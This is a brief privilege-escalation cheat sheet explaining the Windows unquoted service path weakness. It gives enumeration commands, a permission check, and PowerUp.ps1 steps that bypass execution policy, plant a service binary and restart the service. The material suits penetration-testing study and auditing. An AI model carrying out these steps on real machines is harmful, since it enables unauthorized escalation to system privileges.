# Unquoted Service Paths

Windows interprets each space in an unquoted path as a potential end of the executable name.

For path `C:\Program Files\My Program\My Service\service.exe`, Windows tries:
```
C:\Program.exe
C:\Program Files\My.exe
C:\Program Files\My Program\My.exe
C:\Program Files\My Program\My service\service.exe
```

**Enumerate unquoted service paths:**
```powershell
Get-CimInstance -ClassName win32_service | Select Name,State,PathName
# OR
wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """"
```

**Check write permissions on the path:** `icacls <path>`

**Automation with PowerUp.ps1:**
```powershell
powershell -ep bypass
. .\PowerUp.ps1
Get-UnquotedService
Write-ServiceBinary -Name '<VulnerableServiceName>' -Path "C:\Program Files\Enterprise Apps\Current.exe"
Restart-Service <VulnerableServiceName>
```
